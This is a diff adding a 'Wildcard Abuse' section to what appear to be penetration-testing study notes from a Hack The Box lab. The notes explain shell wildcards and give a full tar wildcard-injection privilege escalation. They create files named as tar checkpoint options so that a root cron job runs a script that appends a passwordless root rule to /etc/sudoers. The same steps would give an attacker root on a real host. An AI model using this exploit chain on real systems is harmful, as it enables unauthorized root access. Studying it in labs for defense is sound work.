@@ -768,7 +768,91 @@ PATH ABUSE!!
 
 ---
 
+# Wildcard Abuse
+
+**Wildcards** are special characters interpreted by the shell to match filenames or patterns before executing commands.
+
+## Common Wildcards
+
+| Character | Meaning |
+|-----------|---------|
+| `*`       | Matches any number of characters in a filename |
+| `?`       | Matches a single character |
+| `[ ]`     | Matches any single character inside the brackets |
+| `~`       | Expands to the home directory of the current user or another user (e.g., `~user`) |
+| `-`       | Inside `[ ]` denotes a range of characters |
 
 
+## Privilege Escalation via Wildcards
 
+Some commands (e.g., **tar**) interpret filenames starting with `--` as **options**.  
+If a wildcard (`*`) is used in a command, **maliciously named files** can be executed as options.
+
+### Example: `tar` Abuse with `--checkpoint-action`
+
+From `man tar`:
+- `--checkpoint[=N]` → Show progress every N records (default 10)
+- `--checkpoint-action=ACTION` → Execute ACTION when a checkpoint is reached
+
+### Scenario
+
+**Vulnerable cron job** runs every minute:
+```bash
+*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
+```
+* The `*` wildcard includes **all files** in the directory as arguments.
+* By creating specially named files, we can pass extra options to `tar`.
+
+### Exploit Steps
+
+1. Create a malicious script (`root.sh`) to gain privileges:
+
+```bash
+echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
+```
+
+2. Create files named as `tar` options:
+
+```bash
+echo "" > "--checkpoint-action=exec=sh root.sh"
+echo "" > --checkpoint=1
+```
+
+3. Verify the created files:
+
+```bash
+ls -la
+```
+
+Example output:
+
+```
+-rw-rw-r-- 1 htb-student htb-student    1 --checkpoint=1
+-rw-rw-r-- 1 htb-student htb-student    1 --checkpoint-action=exec=sh root.sh
+-rw-rw-r-- 1 htb-student htb-student   60 root.sh
+```
+
+4. Wait for the cron job to execute.
+
+### Post-Exploitation
+
+Check sudo privileges:
+
+```bash
+sudo -l
+```
+
+Output:
+
+```
+(root) NOPASSWD: ALL
+```
+
+Escalate to root:
+
+```bash
+sudo su
+```
+
+---
 
